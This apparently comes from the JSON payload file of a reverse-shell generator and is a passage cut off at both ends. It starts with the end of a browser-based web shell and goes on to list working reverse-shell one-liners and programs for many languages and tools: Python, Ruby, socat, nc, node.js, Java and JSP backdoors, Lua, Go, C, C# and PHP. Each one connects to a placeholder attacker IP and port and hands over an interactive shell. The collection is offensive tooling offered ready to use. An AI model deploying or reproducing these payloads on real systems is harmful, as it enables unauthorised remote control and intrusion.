eShellContent.innerHTML += escapeHtml(command);\n                eShellContent.innerHTML += \"\\n\";\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _insertStdout(stdout) {\n                eShellContent.innerHTML += escapeHtml(stdout);\n                eShellContent.scrollTop = eShellContent.scrollHeight;\n            }\n\n            function _defer(callback) {\n                setTimeout(callback, 0);\n            }\n\n            function featureShell(command) {\n\n                _insertCommand(command);\n                if (/^\\s*upload\\s+[^\\s]+\\s*$/.test(command)) {\n                    featureUpload(command.match(/^\\s*upload\\s+([^\\s]+)\\s*$/)[1]);\n                } else if (/^\\s*clear\\s*$/.test(command)) {\n                    // Backend shell TERM environment variable not set. Clear command history from UI but keep in buffer\n                    eShellContent.innerHTML = '';\n                } else {\n                    makeRequest(\"?feature=shell\", {cmd: command, cwd: CWD}, function (response) {\n                        if (response.hasOwnProperty('file')) {\n                            featureDownload(atob(response.name), response.file)\n                        } else {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        }\n                    });\n                }\n            }\n\n            function featureHint() {\n                if (eShellCmdInput.value.trim().length === 0) return;  // field is empty -> nothing to complete\n\n                function _requestCallback(data) {\n                    if (data.files.length <= 1) return;  // no completion\n                    data.files = data.files.map(function(file){\n                        return atob(file);\n                    });\n                    if (data.files.length === 2) {\n                        if (type === 'cmd') {\n                            eShellCmdInput.value = data.files[0];\n                        } else {\n                            var currentValue = eShellCmdInput.value;\n                            eShellCmdInput.value = currentValue.replace(/([^\\s]*)$/, data.files[0]);\n                        }\n                    } else {\n                        _insertCommand(eShellCmdInput.value);\n                        _insertStdout(data.files.join(\"\\n\"));\n                    }\n                }\n\n                var currentCmd = eShellCmdInput.value.split(\" \");\n                var type = (currentCmd.length === 1) ? \"cmd\" : \"file\";\n                var fileName = (type === \"cmd\") ? currentCmd[0] : currentCmd[currentCmd.length - 1];\n\n                makeRequest(\n                    \"?feature=hint\",\n                    {\n                        filename: fileName,\n                        cwd: CWD,\n                        type: type\n                    },\n                    _requestCallback\n                );\n\n            }\n\n            function featureDownload(name, file) {\n                var element = document.createElement('a');\n                element.setAttribute('href', 'data:application/octet-stream;base64,' + file);\n                element.setAttribute('download', name);\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.click();\n                document.body.removeChild(element);\n                _insertStdout('Done.');\n            }\n\n            function featureUpload(path) {\n                var element = document.createElement('input');\n                element.setAttribute('type', 'file');\n                element.style.display = 'none';\n                document.body.appendChild(element);\n                element.addEventListener('change', function () {\n                    var promise = getBase64(element.files[0]);\n                    promise.then(function (file) {\n                        makeRequest('?feature=upload', {path: path, file: file, cwd: CWD}, function (response) {\n                            _insertStdout(atob(response.stdout));\n                            updateCwd(atob(response.cwd));\n                        });\n                    }, function () {\n                        _insertStdout('An unknown client-side error occurred.');\n                    });\n                });\n                element.click();\n                document.body.removeChild(element);\n            }\n\n            function getBase64(file, onLoadCallback) {\n                return new Promise(function(resolve, reject) {\n                    var reader = new FileReader();\n                    reader.onload = function() { resolve(reader.result.match(/base64,(.*)$/)[1]); };\n                    reader.onerror = reject;\n                    reader.readAsDataURL(file);\n                });\n            }\n\n            function genPrompt(cwd) {\n                cwd = cwd || \"~\";\n                var shortCwd = cwd;\n                if (cwd.split(\"/\").length > 3) {\n                    var splittedCwd = cwd.split(\"/\");\n                    shortCwd = \"…/\" + splittedCwd[splittedCwd.length-2] + \"/\" + splittedCwd[splittedCwd.length-1];\n                }\n                return SHELL_CONFIG[\"username\"] + \"@\" + SHELL_CONFIG[\"hostname\"] + \":<span title=\\\"\" + cwd + \"\\\">\" + shortCwd + \"</span>#\";\n            }\n\n            function updateCwd(cwd) {\n                if (cwd) {\n                    CWD = cwd;\n                    _updatePrompt();\n                    return;\n                }\n                makeRequest(\"?feature=pwd\", {}, function(response) {\n                    CWD = atob(response.cwd);\n                    _updatePrompt();\n                });\n\n            }\n\n            function escapeHtml(string) {\n                return string\n                    .replace(/&/g, \"&amp;\")\n                    .replace(/</g, \"&lt;\")\n                    .replace(/>/g, \"&gt;\");\n            }\n\n            function _updatePrompt() {\n                var eShellPrompt = document.getElementById(\"shell-prompt\");\n                eShellPrompt.innerHTML = genPrompt(CWD);\n            }\n\n            function _onShellCmdKeyDown(event) {\n                switch (event.key) {\n                    case \"Enter\":\n                        featureShell(eShellCmdInput.value);\n                        insertToHistory(eShellCmdInput.value);\n                        eShellCmdInput.value = \"\";\n                        break;\n                    case \"ArrowUp\":\n                        if (historyPosition > 0) {\n                            historyPosition--;\n                            eShellCmdInput.blur();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                            _defer(function() {\n                                eShellCmdInput.focus();\n                            });\n                        }\n                        break;\n                    case \"ArrowDown\":\n                        if (historyPosition >= commandHistory.length) {\n                            break;\n                        }\n                        historyPosition++;\n                        if (historyPosition === commandHistory.length) {\n                            eShellCmdInput.value = \"\";\n                        } else {\n                            eShellCmdInput.blur();\n                            eShellCmdInput.focus();\n                            eShellCmdInput.value = commandHistory[historyPosition];\n                        }\n                        break;\n                    case 'Tab':\n                        event.preventDefault();\n                        featureHint();\n                        break;\n                }\n            }\n\n            function insertToHistory(cmd) {\n                commandHistory.push(cmd);\n                historyPosition = commandHistory.length;\n            }\n\n            function makeRequest(url, params, callback) {\n                function getQueryString() {\n                    var a = [];\n                    for (var key in params) {\n                        if (params.hasOwnProperty(key)) {\n                            a.push(encodeURIComponent(key) + \"=\" + encodeURIComponent(params[key]));\n                        }\n                    }\n                    return a.join(\"&\");\n                }\n                var xhr = new XMLHttpRequest();\n                xhr.open(\"POST\", url, true);\n                xhr.setRequestHeader(\"Content-Type\", \"application/x-www-form-urlencoded\");\n                xhr.onreadystatechange = function() {\n                    if (xhr.readyState === 4 && xhr.status === 200) {\n                        try {\n                            var responseJson = JSON.parse(xhr.responseText);\n                            callback(responseJson);\n                        } catch (error) {\n                            alert(\"Error while parsing response: \" + error);\n                        }\n                    }\n                };\n                xhr.send(getQueryString());\n            }\n\n            document.onclick = function(event) {\n                event = event || window.event;\n                var selection = window.getSelection();\n                var target = event.target || event.srcElement;\n\n                if (target.tagName === \"SELECT\") {\n                    return;\n                }\n\n                if (!selection.toString()) {\n                    eShellCmdInput.focus();\n                }\n            };\n\n            window.onload = function() {\n                eShellCmdInput = document.getElementById(\"shell-cmd\");\n                eShellContent = document.getElementById(\"shell-content\");\n                updateCwd();\n                eShellCmdInput.focus();\n            };\n        </script>\n    </head>\n\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _   <span></span>\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\/|| || |_ <span></span>\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|<span></span>\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|<span></span>\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|  <span></span>\n|_|                         |___/  \\____/                                  <span></span>\n                </div>\n            </pre>\n            <div id=\"shell-input\">\n                <label for=\"shell-cmd\" id=\"shell-prompt\" class=\"shell-prompt\">???</label>\n                <div>\n                    <input id=\"shell-cmd\" name=\"cmd\" onkeydown=\"_onShellCmdKeyDown(event)\"/>\n                </div>\n            </div>\n        </div>\n    </body>\n\n</html>\n"
      },
      {
        "name": "Python #1",
        "command": "export RHOST=\"{IP}\";export RPORT={PORT};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'\n"
      },
      {
        "name": "Python #2",
        "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'\n"
      },
      {
        "name": "Python3 #1",
        "command": "export RHOST=\"{IP}\";export RPORT={PORT};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"bash\")'\n"
      },
      {
        "name": "Python3 #2",
        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{IP}\",{PORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'\n"
      },
      {
        "name": "Python3 shortest",
        "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{IP}\",{PORT}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"bash\")'\n"
      },
      {
        "name": "Ruby #1",
        "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{IP}\",{PORT}))'\n"
      },
      {
        "name": "Ruby no sh",
        "command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{IP}\",\"{PORT}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'\n"
      },
      {
        "name": "socat #1",
        "command": "socat TCP:{IP}:{PORT} EXEC:bash"
      },
      {
        "name": "socat #2 (TTY)",
        "command": "socat TCP:{IP}:{PORT} EXEC:'bash',pty,stderr,setsid,sigint,sane"
      },
      {
        "name": "sqlite3 nc mkfifo",
        "command": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc {IP} {PORT} >/tmp/f'"
      },
      {
        "name": "node.js #1",
        "command": "require('child_process').exec('nc -e bash {IP} {PORT}')"
      },
      {
        "name": "node.js #2",
        "command": "(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"bash\", []);\n    var client = new net.Socket();\n    client.connect({PORT}, \"{IP}\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/; // Prevents the Node.js application from crashing\n})();\n"
      },
      {
        "name": "Java #1",
        "command": "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}\n"
      },
      {
        "name": "Java #2",
        "command": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}\n"
      },
      {
        "name": "Java #3",
        "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{IP}\";\n        int port = {PORT};\n        String cmd = \"bash\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}\n"
      },
      {
        "name": "Java Web",
        "command": "<%@\npage import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\n% >\n<%!\nstatic class StreamConnector extends Thread\n{\n        InputStream is;\n        OutputStream os;\n        StreamConnector(InputStream is, OutputStream os)\n        {\n                this.is = is;\n                this.os = os;\n        }\n        public void run()\n        {\n                BufferedReader isr = null;\n                BufferedWriter osw = null;\n                try\n                {\n                        isr = new BufferedReader(new InputStreamReader(is));\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\n                        char buffer[] = new char[8192];\n                        int lenRead;\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\n                        {\n                                osw.write(buffer, 0, lenRead);\n                                osw.flush();\n                        }\n                }\n                catch (Exception ioe)\n                try\n                {\n                        if(isr != null) isr.close();\n                        if(osw != null) osw.close();\n                }\n                catch (Exception ioe)\n        }\n}\n%>\n\n<h1>JSP Backdoor Reverse Shell</h1>\n\n<form method=\"post\">\nIP Address\n<input type=\"text\" name=\"ipaddress\" size=30>\nPort\n<input type=\"text\" name=\"port\" size=10>\n<input type=\"submit\" name=\"Connect\" value=\"Connect\">\n</form>\n<p>\n<hr>\n\n<%\nString ipAddress = request.getParameter(\"ipaddress\");\nString ipPort = request.getParameter(\"port\");\nif(ipAddress != null && ipPort != null)\n{\n        Socket sock = null;\n        try\n        {\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\n                Runtime rt = Runtime.getRuntime();\n                Process proc = rt.exec(\"cmd.exe\");\n                StreamConnector outputConnector =\n                        new StreamConnector(proc.getInputStream(),\n                                          sock.getOutputStream());\n                StreamConnector inputConnector =\n                        new StreamConnector(sock.getInputStream(),\n                                          proc.getOutputStream());\n                outputConnector.start();\n                inputConnector.start();\n        }\n        catch(Exception e) \n}\n%>\n"
      },
      {
        "name": "Java Two Way",
        "command": "<%\n    /*\n     * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.\n     * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.\n     * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button \"send\" is clicked, it will try to connect to the reverse shell again (apart from executing \n     * the command specified in the HTML form). This is to avoid to keep it simple.\n     */\n%>\n\n<%@page import=\"java.lang.*\"%>\n<%@page import=\"java.io.*\"%>\n<%@page import=\"java.net.*\"%>\n<%@page import=\"java.util.*\"%>\n\n<html>\n<head>\n    <title>jrshell</title>\n</head>\n<body>\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\n    <input TYPE=\"text\" NAME=\"shell\">\n    <input TYPE=\"submit\" VALUE=\"Send\">\n</form>\n<pre>\n<%\n    // Define the OS\n    String shellPath = null;\n    try\n    {\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n            shellPath = new String(\"/bin/sh\");\n        } else {\n            shellPath = new String(\"cmd.exe\");\n        }\n    } catch( Exception e ){}\n    // INNER HTML PART\n    if (request.getParameter(\"shell\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\n        Process p;\n        if (shellPath.equals(\"cmd.exe\"))\n            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\n        else\n            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n            out.println(disr);\n            disr = dis.readLine();\n        }\n    }\n    // TCP PORT PART\n    class StreamConnector extends Thread\n    {\n        InputStream wz;\n        OutputStream yr;\n        StreamConnector( InputStream wz, OutputStream yr ) {\n            this.wz = wz;\n            this.yr = yr;\n        }\n        public void run()\n        {\n            BufferedReader r  = null;\n            BufferedWriter w = null;\n            try\n            {\n                r  = new BufferedReader(new InputStreamReader(wz));\n                w = new BufferedWriter(new OutputStreamWriter(yr));\n                char buffer[] = new char[8192];\n                int length;\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\n                {\n                    w.write( buffer, 0, length );\n                    w.flush();\n                }\n            } catch( Exception e ){}\n            try\n            {\n                if( r != null )\n                    r.close();\n                if( w != null )\n                    w.close();\n            } catch( Exception e ){}\n        }\n    }\n \n    try {\n        Socket socket = new Socket( \"{IP}\", {PORT} ); // Replace with wanted ip and port\n        Process process = Runtime.getRuntime().exec( shellPath );\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\n        out.println(\"port opened on \" + socket);\n     } catch( Exception e ) {}\n%>\n</pre>\n</body>\n</html>\n"
      },
      {
        "name": "Javascript",
        "command": "String command = \"var host = '{IP}';\" +\n                       \"var port = {PORT};\" +\n                       \"var cmd = 'bash';\"+\n                       \"var s = new java.net.Socket(host, port);\" +\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\n                       \"print ('Connected');\"+\n                       \"while (!s.isClosed()) {\"+\n                       \"    while (pi.available() > 0)\"+\n                       \"        so.write(pi.read());\"+\n                       \"    while (pe.available() > 0)\"+\n                       \"        so.write(pe.read());\"+\n                       \"    while (si.available() > 0)\"+\n                       \"        po.write(si.read());\"+\n                       \"    so.flush();\"+\n                       \"    po.flush();\"+\n                       \"    java.lang.Thread.sleep(50);\"+\n                       \"    try {\"+\n                       \"        p.exitValue();\"+\n                       \"        break;\"+\n                       \"    }\"+\n                       \"    catch (e) {\"+\n                       \"    }\"+\n                       \"}\"+\n                       \"p.destroy();\"+\n                       \"s.close();\";\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\nref.add(new StringRefAddr(\"x\", x);\n"
      },
      {
        "name": "telnet",
        "command": "TF=$(mktemp -u);mkfifo $TF && telnet {IP} {PORT} 0<$TF | bash 1>$TF"
      },
      {
        "name": "zsh",
        "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {IP} {PORT} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'"
      },
      {
        "name": "Lua #1",
        "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{IP}','{PORT}');os.execute('bash -i <&3 >&3 2>&3');\"\n"
      },
      {
        "name": "Lua #2",
        "command": "lua5.1 -e 'local host, port = \"{IP}\", {PORT} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'\n"
      },
      {
        "name": "Golang",
        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{IP}:{PORT}\");cmd:=exec.Command(\"bash\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go\n"
      },
      {
        "name": "Vlang",
        "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e bash {IP} {PORT} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v\n"
      },
      {
        "name": "Awk",
        "command": "awk 'BEGIN {s = \"/inet/tcp/0/{IP}/{PORT}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null\n"
      },
      {
        "name": "Dart",
        "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{IP}\", {PORT}).then((socket) {\n    socket.listen((data) {\n      Process.start('bash', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}\n"
      },
      {
        "name": "Crystal (system)",
        "command": "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{IP}\",{PORT});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'\n"
      },
      {
        "name": "Crystal (code)",
        "command": "crystal eval 'require \\\"process\\\";require \\\"socket\\\";c=Socket.tcp(Socket::Family::INET);c.connect(\\\"{IP}\\\",{PORT});loop{m,l=c.receive;p=Process.new(m.rstrip(\\\"\\\\n\\\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'\\n\n"
      }

	],
  "Windows": [
    {
      "name": "nc.exe -e",
      "command": "nc.exe {IP} {PORT} -e powershell"
    },
    {
      "name": "ncat.exe -e",
      "command": "ncat.exe {IP} {PORT} -e powershell"
    },
    {
      "name": "C Windows",
      "command": "#include <winsock2.h>\n#include <stdio.h>\n#pragma comment(lib,\"ws2_32\")\n\nWSADATA wsaData;\nSOCKET Winsock;\nstruct sockaddr_in hax; \nchar ip_addr[16] = \"{IP}\"; \nchar port[6] = \"{PORT}\";            \n\nSTARTUPINFO ini_processo;\n\nPROCESS_INFORMATION processo_info;\n\nint main()\n{\n    WSAStartup(MAKEWORD(2, 2), &wsaData);\n    Winsock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);\n\n\n    struct hostent *host; \n    host = gethostbyname(ip_addr);\n    strcpy_s(ip_addr, 16, inet_ntoa(*((struct in_addr *)host->h_addr)));\n\n    hax.sin_family = AF_INET;\n    hax.sin_port = htons(atoi(port));\n    hax.sin_addr.s_addr = inet_addr(ip_addr);\n\n    WSAConnect(Winsock, (SOCKADDR*)&hax, sizeof(hax), NULL, NULL, NULL, NULL);\n\n    memset(&ini_processo, 0, sizeof(ini_processo));\n    ini_processo.cb = sizeof(ini_processo);\n    ini_processo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; \n    ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;\n\n    TCHAR cmd[255] = TEXT(\"cmd.exe\");\n\n    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);\n\n    return 0;\n}\n"
    },
    {
      "name": "C# TCP Client",
      "command": "using System;\nusing System.Text;\nusing System.IO;\nusing System.Diagnostics;\nusing System.ComponentModel;\nusing System.Linq;\nusing System.Net;\nusing System.Net.Sockets;\n\n\nnamespace ConnectBack\n{\n    public class Program\n    {\n        static StreamWriter streamWriter;\n\n        public static void Main(string[] args)\n        {\n            using(TcpClient client = new TcpClient(\"{IP}\", {PORT}))\n            {\n                using(Stream stream = client.GetStream())\n                {\n                    using(StreamReader rdr = new StreamReader(stream))\n                    {\n                        streamWriter = new StreamWriter(stream);\n                        \n                        StringBuilder strInput = new StringBuilder();\n\n                        Process p = new Process();\n                        p.StartInfo.FileName = \"powershell\";\n                        p.StartInfo.CreateNoWindow = true;\n                        p.StartInfo.UseShellExecute = false;\n                        p.StartInfo.RedirectStandardOutput = true;\n                        p.StartInfo.RedirectStandardInput = true;\n                        p.StartInfo.RedirectStandardError = true;\n                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);\n                        p.Start();\n                        p.BeginOutputReadLine();\n\n                        while(true)\n                        {\n                            strInput.Append(rdr.ReadLine());\n                            //strInput.Append(\"\\n\");\n                            p.StandardInput.WriteLine(strInput);\n                            strInput.Remove(0, strInput.Length);\n                        }\n                    }\n                }\n            }\n        }\n\n        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)\n        {\n            StringBuilder strOutput = new StringBuilder();\n\n            if (!String.IsNullOrEmpty(outLine.Data))\n            {\n                try\n                {\n                    strOutput.Append(outLine.Data);\n                    streamWriter.WriteLine(strOutput);\n                    streamWriter.Flush();\n                }\n                catch (Exception err) { }\n            }\n        }\n\n    }\n}\n"
    },
    {
      "name": "C# bash -i",
      "command": "using System;\nusing System.Diagnostics;\n\nnamespace BackConnect {\n  class ReverseBash {\n    public static void Main(string[] args) {\n      Process proc = new System.Diagnostics.Process();\n      proc.StartInfo.FileName = \"bash\";\n      proc.StartInfo.Arguments = \"-c \\\"bash -i >& /dev/tcp/{IP}/{PORT} 0>&1\\\"\";\n      proc.StartInfo.UseShellExecute = false;\n      proc.StartInfo.RedirectStandardOutput = true;\n      proc.Start();\n\n      while (!proc.StandardOutput.EndOfStream) {\n        Console.WriteLine(proc.StandardOutput.ReadLine());\n      }\n    }\n  }\n}\n"
    },
    {
      "name": "PHP PentestMonkey",
      "command": "<?php\n// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php\n// Copyright (C) 2007 pentestmonkey@pentestmonkey.net\n\nset_time_limit (0);\n$VERSION = \"1.0\";\n$ip = '{IP}';\n$port = {PORT};\n$chunk_size = 1400;\n$write_a = null;\n$error_a = null;\n$shell = 'uname -a; w; id; bash -i';\n$daemon = 0;\n$debug = 0;\n\nif (function_exists('pcntl_fork')) {\n    $pid = pcntl_fork();\n    \n    if ($pid == -1) {\n        printit(\"ERROR: Can't fork\");\n        exit(1);\n    }\n    \n    if ($pid) {\n        exit(0);  // Parent exits\n    }\n    if (posix_setsid() == -1) {\n        printit(\"Error: Can't setsid()\");\n        exit(1);\n    }\n\n    $daemon = 1;\n} else {\n    printit(\"WARNING: Failed to daemonise.  This is quite common and not fatal.\");\n}\n\nchdir(\"/\");\n\numask(0);\n\n// Open reverse connection\n$sock = fsockopen($ip, $port, $errno, $errstr, 30);\nif (!$sock) {\n    printit(\"$errstr ($errno)\");\n    exit(1);\n}\n\n$descriptorspec = array(\n   0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from\n   1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to\n   2 => array(\"pipe\", \"w\")   // stderr is a pipe that the child will write to\n);\n\n$process = proc_open($shell, $descriptorspec, $pipes);\n\nif (!is_resource($process)) {\n    printit(\"ERROR: Can't spawn shell\");\n    exit(1);\n}\n\nstream_set_blocking($pipes[0], 0);\nstream_set_blocking($pipes[1], 0);\nstream_set_blocking($pipes[2], 0);\nstream_set_blocking($sock, 0);\n\nprintit(\"Successfully opened reverse shell to $ip:$port\");\n\nwhile (1) {\n    if (feof($sock)) {\n        printit(\"ERROR: Shell connection terminated\");\n        break;\n    }\n\n    if (feof($pipes[1])) {\n        printit(\"ERROR: Shell process terminated\");\n        break;\n    }\n\n    $read_a = array($sock, $pipes[1], $pipes[2]);\n    $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);\n\n    if (in_array($sock, $read_a)) {\n        if ($debug) printit(\"SOCK READ\");\n        $input = fread($sock, $chunk_size);\n        if ($debug) printit(\"SOCK: $input\");\n        fwrite($pipes[0], $input);\n    }\n\n    if (in_array($pipes[1], $read_a)) {\n        if ($debug) printit(\"STDOUT READ\");\n        $input = fread($pipes[1], $chunk_size);\n        if ($debug) printit(\"STDOUT: $input\");\n        fwrite($sock, $input);\n    }\n\n    if (in_array($pipes[2], $read_a)) {\n        if ($debug) printit(\"STDERR READ\");\n        $input = fread($pipes[2], $chunk_size);\n        if ($debug) printit(\"STDERR: $input\");\n        fwrite($sock, $input);\n    }\n}\n\nfclose($sock);\nfclose($pipes[0]);\nfclose($pipes[1]);\nfclose($pipes[2]);\nproc_close($process);\n\nfunction printit ($string) {\n    if (!$daemon) {\n        print \"$string\\n\";\n    }\n}\n\n?>\n"
    },
    {
      "name": "PHP Ivan Sincek",
      "command": "<?php\n// Copyright (c) 2020 Ivan Sincek\n// v2.3\n// Requires PHP v5.0.0 or greater.\n// Works on Linux OS, macOS, and Windows OS.\n// See the original script at https://github.com/pentestmonkey/php-reverse-shell.\nclass Shell {\n    private $addr  = null;\n    private $port  = null;\n    private $os    = null;\n    private $shell = null;\n    private $descriptorspec = array(\n        0 => array('pipe', 'r'), // shell can read from STDIN\n        1 => array('pipe', 'w'), // shell can write to STDOUT\n        2 => array('pipe', 'w')  // shell can write to STDERR\n    );\n    private $buffer  = 1024;    // read/write buffer size\n    private $clen    = 0;       // command length\n    private $error   = false;   // stream read/write error\n    public function __construct($addr, $port) {\n        $this->addr = $addr;\n        $this->port = $port;\n    }\n    private function detect() {\n        $detected = true;\n        if (stripos(PHP_OS, 'LINUX') !== false) { // same for macOS\n            $this->os    = 'LINUX';\n            $this->shell = 'bash';\n        } else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {\n            $this->os    = 'WINDOWS';\n            $this->shell = 'cmd.exe';\n        } else {\n            $detected = false;\n            echo \"SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n\";\n        }\n        return $detected;\n    }\n    private function daemonize() {\n        $exit = false;\n        if (!function_exists('pcntl_fork')) {\n            echo \"DAEMONIZE: pcntl_fork() does not exists, moving on...\\n\";\n        } else if (($pid = @pcntl_fork()) < 0) {\n            echo \"DAEMONIZE: Cannot fork off the parent process, moving on...\\n\";\n        } else if ($pid > 0) {\n            $exit = true;\n            echo \"DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n\";\n        } else if (posix_setsid() < 0) {\n            // once daemonized you will actually no longer see the script's dump\n            echo \"DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n\";\n        